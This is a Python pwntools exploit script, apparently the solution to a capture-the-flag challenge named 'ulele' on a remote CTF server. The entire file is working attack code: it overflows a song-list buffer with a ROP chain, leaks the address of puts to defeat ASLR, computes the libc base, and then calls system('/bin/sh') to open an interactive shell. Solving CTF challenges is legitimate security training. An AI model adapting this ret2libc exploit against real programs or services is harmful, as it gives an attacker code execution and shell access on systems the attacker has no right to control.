#!/usr/bin/env python3

from pwn import *

context.arch = 'amd64'

PATH = './ulele'

HOST = 'ctf.gemastik.id'
PORT = 1313

def add_song(title, artist, duration):
    r.sendlineafter(b': ', b'1')
    if len(title) < 256:
        title += b'\n'
    if len(artist) < 256:
        artist += b'\n'
    r.sendafter(b': ', title)
    r.sendafter(b': ', artist)
    r.sendlineafter(b': ', f'{duration}'.encode())

def remove_song(idx):
    r.sendlineafter(b': ', b'2')
    r.sendlineafter(b': ', f'{idx}'.encode())

def exploit(r):
    for i in range(99):
        add_song(b'A' * 8, b'B' * 8, 1)

    usefull = 0x401792 # mov rdi, rbp; nop; pop rbp; ret;

    add_song(b'X' * 8, b'Y' * 120 + 
             p64(elf.got.puts) + # rbp
             p64(usefull) + 
             p64(0xdeadbeef) + # rbp
             p64(elf.sym.puts) + 
             p64(elf.sym._start), 
             1)
    
    r.sendlineafter(b': ', b'4') # exit trigger ret
    r.recvline(0)
    
    puts = u64(r.recvline(0).ljust(8, b'\0'))
    libc.address = puts - libc.sym.puts
    
    info(hex(puts))
    info(hex(libc.address))
    
    remove_song(100)
    
    libc_pop_rdi = next(libc.search(asm('pop rdi; ret')))
    libc_bin_sh = next(libc.search(b'/bin/sh'))
    
    add_song(b'X' * 8, b'Y' * 128 + 
             p64(libc_pop_rdi) + p64(libc_bin_sh) + 
             p64(libc_pop_rdi+1) + # ret
             p64(libc.sym.system), 
             1)
    
    r.interactive()

if __name__ == '__main__':
    elf = ELF(PATH, checksec=True)
    libc = ELF('./libc.so.6', checksec=False)
   
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = elf.process(aslr=False, env={})
    exploit(r)